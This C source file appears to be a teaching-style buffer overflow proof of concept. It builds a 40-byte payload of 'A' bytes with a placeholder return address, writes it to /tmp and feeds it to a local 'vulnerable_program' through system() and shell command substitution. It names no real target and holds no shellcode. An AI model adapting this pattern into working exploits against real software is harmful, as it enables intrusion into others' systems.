#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

/* Buffer Overflow Exploit Proof-of-Concept */
#define BUFFER_SIZE 28  // Original vulnerable size
#define OVERFLOW_SIZE 40 // Overflow buffer to overwrite return address

int main(int argc, char *argv[])
{
    char *buffer;
    FILE *f;

    /* Allocate buffer with controlled overflow */
    buffer = (char *)malloc(OVERFLOW_SIZE);
    if (!buffer)
    {
        perror("malloc failed");
        exit(EXIT_FAILURE);
    }

    /* Fill buffer with 'A's (0x41) to overflow stack */
    memset(buffer, 0x41, OVERFLOW_SIZE);

    /* Overwrite return address with controlled value */
    unsigned long *ptr = (unsigned long *)(buffer + BUFFER_SIZE);
    *ptr = 0x41414141;  // Placeholder return address

    /* Write exploit payload to a file */
    f = fopen("/tmp/exploit_payload", "wb");
    if (!f)
    {
        perror("fopen failed");
        free(buffer);
        exit(EXIT_FAILURE);
    }
    fwrite(buffer, 1, OVERFLOW_SIZE, f);
    fclose(f);

    printf("Exploit payload written to /tmp/exploit_payload\n");
    
    /* Trigger the vulnerability */
    printf("Triggering buffer overflow...\n");
    fflush(stdout);

    char command[50];
    snprintf(command, sizeof(command), "./vulnerable_program $(cat /tmp/exploit_payload)");
    system(command);  // Simulate exploit execution

    /* Cleanup */
    free(buffer);
    return 0;
}
